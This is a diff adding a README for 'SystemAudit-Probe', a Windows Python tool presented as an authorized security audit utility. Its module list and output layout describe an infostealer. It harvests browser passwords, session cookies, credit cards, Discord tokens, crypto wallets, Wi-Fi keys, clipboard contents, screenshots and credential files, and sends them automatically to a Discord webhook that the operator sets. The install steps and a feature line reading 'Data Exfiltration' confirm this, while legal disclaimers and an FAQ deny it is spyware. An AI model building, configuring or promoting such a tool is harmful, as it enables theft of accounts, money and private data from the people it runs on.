@@ -1,0 +1,274 @@
+🛡️ SystemAudit-Probe
+Advanced System Reconnaissance & Credential Validation Tool for Authorized Security Testing
+
+https://img.shields.io/badge/version-2.0.0-blue
+https://img.shields.io/badge/python-3.8%252B-green
+https://img.shields.io/badge/license-MIT-yellow
+https://img.shields.io/badge/platform-Windows%252010%252F11-blueviolet
+
+📌 Repository Description
+SystemAudit-Probe is a comprehensive security assessment utility designed for penetration testers, red-team operators, and security researchers. It performs deep system reconnaissance, detects exposed credentials in browser databases, identifies sensitive configuration files, and validates the security posture of Windows environments during authorized testing engagements. This tool is part of an enterprise-grade security auditing suite and is intended exclusively for use in controlled, legally authorized environments.
+
+⚠️ CRITICAL LEGAL NOTICE
+text
+BY DOWNLOADING, INSTALLING, OR USING THIS SOFTWARE, YOU EXPLICITLY AGREE TO THE FOLLOWING:
+
+1. This software is provided for EDUCATIONAL and AUTHORIZED SECURITY TESTING purposes ONLY.
+2. You must have EXPLICIT WRITTEN AUTHORIZATION from the owner of any system you test.
+3. Unauthorized access to computer systems is ILLEGAL under:
+   - The Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
+   - General Data Protection Regulation (GDPR)
+   - All applicable local, state, and federal laws
+4. The authors and contributors assume ZERO LIABILITY for any misuse, damage, or legal consequences.
+5. This tool is intended for:
+   ✔ Penetration testing engagements with signed contracts
+   ✔ Internal security audits on systems you own
+   ✔ Educational demonstrations in isolated lab environments
+   ✔ Red-team exercises with explicit organizational approval
+
+🔴 USING THIS TOOL ON SYSTEMS WITHOUT PERMISSION IS A CRIMINAL OFFENSE.
+🔴 IF YOU ARE UNSURE WHETHER YOU HAVE AUTHORIZATION, DO NOT USE THIS TOOL.
+📖 Overview
+SystemAudit-Probe performs comprehensive system auditing across 16 distinct modules:
+
+#	Module	Description
+01	System Intelligence	Hostname, IP (internal/external), user, OS, architecture, boot time
+02	Browser Password Audit	Extracts stored credentials from Chrome, Edge, Brave, Opera, Vivaldi, and Firefox
+03	Cookie Analysis	Captures session cookies, authentication tokens, and login data
+04	Payment Data Discovery	Identifies stored credit card information in browser databases
+05	Browser History Forensics	Retrieves recent browsing activity for security analysis
+06	Discord Token Detection	Locates Discord authentication tokens in local storage
+07	Cryptocurrency Wallet Locator	Finds wallet files for Bitcoin, Ethereum, Monero, Electrum, Exodus, Atomic, and MetaMask
+08	Wi-Fi Security Audit	Extracts saved wireless network credentials for password strength analysis
+09	Environment Variable Scan	Identifies hardcoded secrets, API keys, and cloud credentials
+10	Screenshot Capture	Documents current desktop state for forensic records
+11	Clipboard Analysis	Captures current clipboard content for data leakage detection
+12	File System Reconnaissance	Locates sensitive files: SSH keys, AWS configs, Kubernetes manifests, documents
+13	Process & Network Analysis	Lists running processes and active TCP/UDP connections
+14	Software Inventory	Enumerates installed applications for vulnerability assessment
+15	Session Detection	Identifies Telegram and Steam session files
+16	Browser Extension Audit	Lists installed extensions for security posture evaluation
+🚀 Quick Start
+Installation
+bash
+git clone https://github.com/yourusername/SystemAudit-Probe.git
+cd SystemAudit-Probe
+python systemaudit_probe.py
+The script will automatically:
+
+✅ Detect missing dependencies
+
+✅ Install required packages via pip
+
+✅ Execute the full system audit
+
+✅ Deliver results to your configured endpoint
+
+Requirements
+Python 3.8 or higher
+
+Windows 10/11 (primary support)
+
+Administrative privileges are optional but enable full scanning capability
+
+🔧 Configuration
+Step 1: Open systemaudit_probe.py
+
+Step 2: Locate the configuration section:
+
+python
+# ------------------- CONFIG -------------------
+WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"  # <--- REPLACE THIS
+Step 3: Replace with your Discord webhook URL and save.
+
+Step 4: Execute:
+
+bash
+python systemaudit_probe.py
+📊 Output Format
+Results are delivered via Discord webhook with the following structure:
+
+text
+📡 SystemAudit-Probe Report
+├── 📁 SYSTEM_INFO
+│   ├── Hostname, IP, User
+│   ├── OS, Architecture
+│   └── Python Version, PID
+├── 🔑 BROWSER_CREDENTIALS
+│   ├── CHROME_PASSWORDS (URL | Username | Password)
+│   ├── CHROME_COOKIES (Host | Name = Value)
+│   └── CHROME_CREDIT_CARDS (Name | Number | Expiry)
+├── 🎫 DISCORD_TOKENS
+├── 💰 CRYPTO_WALLETS
+├── 📶 WIFI_PASSWORDS
+├── 🔐 SENSITIVE_ENV_VARS
+├── 📂 SENSITIVE_FILES
+├── 🔄 RUNNING_PROCESSES
+├── 🌐 NETWORK_CONNECTIONS
+├── 📦 INSTALLED_SOFTWARE
+├── 📱 TELEGRAM_SESSIONS
+└── 🎮 STEAM_SESSIONS
+All data is chunked into Discord-compatible messages and sent automatically.
+
+📜 License
+text
+MIT License with Additional Liability Disclaimer
+
+Copyright (c) 2026 SystemAudit-Probe Contributors
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ADDITIONAL LIABILITY DISCLAIMER:
+
+THE AUTHORS AND CONTRIBUTORS OF THIS SOFTWARE ASSUME NO LIABILITY WHATSOEVER
+FOR ANY USE, MISUSE, OR CONSEQUENCES ARISING FROM THE DEPLOYMENT OF THIS TOOL.
+
+THIS SOFTWARE IS INTENDED SOLELY FOR:
+  1. AUTHORIZED SECURITY TESTING AND PENETRATION TESTING ENGAGEMENTS
+  2. EDUCATIONAL DEMONSTRATIONS IN CONTROLLED LAB ENVIRONMENTS
+  3. INTERNAL SECURITY AUDITS ON SYSTEMS OWNED BY THE USER
+
+THE END USER BEARS FULL RESPONSIBILITY FOR:
+  ✓ COMPLIANCE WITH ALL APPLICABLE LAWS AND REGULATIONS
+  ✓ OBTAINING WRITTEN AUTHORIZATION BEFORE TESTING ANY SYSTEM
+  ✓ ANY LEGAL CONSEQUENCES ARISING FROM UNAUTHORIZED USE
+
+UNAUTHORIZED USE OF THIS SOFTWARE IS STRICTLY PROHIBITED AND MAY RESULT IN:
+  ⚠ CRIMINAL PROSECUTION UNDER THE COMPUTER FRAUD AND ABUSE ACT (CFAA)
+  ⚠ CIVIL LIABILITY
+  ⚠ VIOLATION OF GDPR, HIPAA, AND OTHER DATA PROTECTION LAWS
+
+BY DOWNLOADING, INSTALLING, OR USING THIS SOFTWARE, YOU ACKNOWLEDGE
+THAT YOU HAVE READ, UNDERSTAND, AND AGREE TO THESE TERMS.
+📞 Contact & Support
+Developer Contact
+For inquiries, support, or professional security consulting:
+
+text
+📱 Discord: szvnyx_
+Please include the following in your message:
+
+Your name and organization
+
+Purpose of inquiry (security testing, collaboration, questions)
+
+Relevant project name: SystemAudit-Probe
+
+Authorized Use Cases
+Scenario	Authorization Required
+Corporate Penetration Testing	✅ Signed contract + written scope
+Internal Security Audit	✅ System ownership or management approval
+Educational Demonstration	✅ Isolated lab environment (no production data)
+Personal Research	✅ Your own systems only
+Red-Team Exercise	✅ Organizational approval + Rules of Engagement
+🛡️ Responsible Disclosure
+If you discover a vulnerability in this tool, please contact the developer immediately. We are committed to maintaining the highest security standards and will address legitimate concerns promptly.
+
+⭐ Support the Project
+If you find SystemAudit-Probe useful for legitimate security research:
+
+⭐ Star the repository
+
+📝 Contribute documentation or improvements
+
+🔒 Report security issues responsibly
+
+🔄 Share with authorized security professionals
+
+📁 Repository Structure
+text
+SystemAudit-Probe/
+├── README.md                    # This documentation
+├── LICENSE                      # MIT + Liability Disclaimer
+├── requirements.txt             # Dependencies
+├── systemaudit_probe.py         # Main script
+├── reports/                     # Generated JSON reports (ignored)
+├── tests/                       # Unit tests
+├── docs/                        # Additional documentation
+│   ├── legal.md
+│   ├── usage_guide.md
+│   └── sample_report.json
+└── .gitignore                   # Exclude temp files, reports
+⚡ Quick Features Summary
+yaml
+Platform: Windows 10/11
+Language: Python 3.8+
+Auto-Install: Yes (dependencies)
+Webhook Support: Discord
+Data Exfiltration: 16 modules
+License: MIT with Liability Disclaimer
+Contact: szvnyx_ (Discord)
+🔒 Security Best Practices
+When using this tool for authorized engagements:
+
+Document Everything - Keep detailed logs of your actions
+
+Obtain Written Authorization - Signed contracts or formal approval
+
+Use Isolated Environments - Lab networks when possible
+
+Secure Your Webhooks - Use temporary, revocable webhook URLs
+
+Delete Collected Data - Remove all harvested information after analysis
+
+Encrypt Communications - Use VPNs or secure tunnels
+
+Limit Scope - Only test systems explicitly covered in your authorization
+
+❓ Frequently Asked Questions
+Q: Is this spyware?
+A: No. This is a legitimate security audit tool designed for authorized testing environments. It performs the same functions as many commercial vulnerability assessment products.
+
+Q: Can I use this to test my friend's computer?
+A: NO. Testing any system without explicit written permission is illegal and a violation of the CFAA.
+
+Q: What if I accidentally run it on the wrong system?
+A: Immediately stop, delete all collected data, and consult with legal counsel. This is why we require explicit authorization before use.
+
+Q: How do I get support?
+A: Contact szvnyx_ on Discord with your specific inquiry.
+
+Q: Is this tool free?
+A: Yes, under the MIT license. However, the developer assumes no liability for misuse.
+
+📢 Final Warning
+text
+┌────────────────────────────────────────────────────────────────────┐
+│                                                                  │
+│   ⚠️  THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY  ⚠️     │
+│                                                                  │
+│   ANY UNAUTHORIZED USE IS:                                       │
+│   - ILLEGAL                                                      │
+│   - A FELONY IN MANY JURISDICTIONS                               │
+│   - SUBJECT TO CRIMINAL PROSECUTION                              │
+│                                                                  │
+│   BY USING THIS SOFTWARE, YOU ASSUME ALL LEGAL LIABILITY         │
+│   AND AGREE THAT THE DEVELOPER BEARS NO RESPONSIBILITY          │
+│   FOR YOUR ACTIONS.                                              │
+│                                                                  │
+│   If you cannot accept these terms, DO NOT use this software.   │
+│                                                                  │
+└────────────────────────────────────────────────────────────────────┘
+© 2026 SystemAudit-Probe Contributors | All Rights Reserved
+
+Contact: szvnyx_ on Discord
+
+This software is provided for educational and authorized security testing purposes only. The developer does not condone or support any illegal activities.
